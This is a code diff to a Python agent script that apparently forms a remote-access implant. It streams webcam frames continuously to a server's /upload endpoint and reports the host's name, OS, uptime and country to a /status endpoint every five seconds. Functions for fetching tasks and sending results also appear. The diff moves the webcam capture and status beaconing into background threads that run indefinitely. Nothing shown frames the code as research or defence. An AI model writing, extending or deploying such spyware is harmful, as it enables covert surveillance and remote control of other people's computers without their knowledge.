@@ -1,4 +1,4 @@
-import time, uuid,requests,platform,psutil,os,subprocess,asyncio,cv2
+import time, uuid,requests,platform,psutil,os,subprocess,asyncio,cv2, threading
 
 from datetime import timedelta
 
@@ -16,16 +16,19 @@ headers = {
 }
 
 def camera():
-    ret, frame = cap.read()
+    while 1:
+        ret, frame = cap.read()
 
-    success, encoded_img = cv2.imencode('.jpg', frame)
+        success, encoded_img = cv2.imencode('.jpg', frame)
 
-    files = {'image': ('frame.jpg', encoded_img.tobytes(), 'image/jpeg')}
+        files = {'image': ('frame.jpg', encoded_img.tobytes(), 'image/jpeg')}
         
-    try:
-        response = requests.post(SERVER_URL+"/upload", files=files, timeout=1)
-    except requests.exceptions.RequestException as e:
-        print(f"Error sending frame: {e}")
+        try:
+            response = requests.post(SERVER_URL+"/upload", files=files, timeout=1)
+        except requests.exceptions.RequestException as e:
+            print(f"Error sending frame: {e}")
+
+        time.sleep(0.03)
 
 def get_country():
     get_region = requests.get("https://www.whatismyip.net/geoip/")
@@ -64,24 +67,25 @@ def send_msg(result):
         pass
 
 def status(): 
-    payload = {"agent_id": AGENT_ID, "hostname":platform.node(),"uptime":str(get_uptime()), "os":platform.system(), "country":get_country() }
-
-    try:
-        resp = requests.post(SERVER_URL + "/status", json=payload, headers=headers)
+    while 1:
+        payload = {"agent_id": AGENT_ID, "hostname":platform.node(),"uptime":str(get_uptime()), "os":platform.system(), "country":get_country() }
+               
+        try:
+            resp = requests.post(SERVER_URL + "/status", json=payload, headers=headers)
         
-        if resp.status_code == 200:
-            data = resp.json()
-            print(data)
-    except Exception as err:
-        print(err)
+            if resp.status_code == 200:
+                data = resp.json()
+                print(data)
+
+            time.sleep(5)
+        except Exception as err:
+            print(err)
 
 
 def main():
-    while 1 and cap.isOpened():
-        status()
-        get_task()
-        camera()
-        time.sleep(0.03)
+    threading.Thread(target=status).start()
+        #get_task()
+    threading.Thread(target=camera).start()
 
 if "__main__" == __name__:
     main()
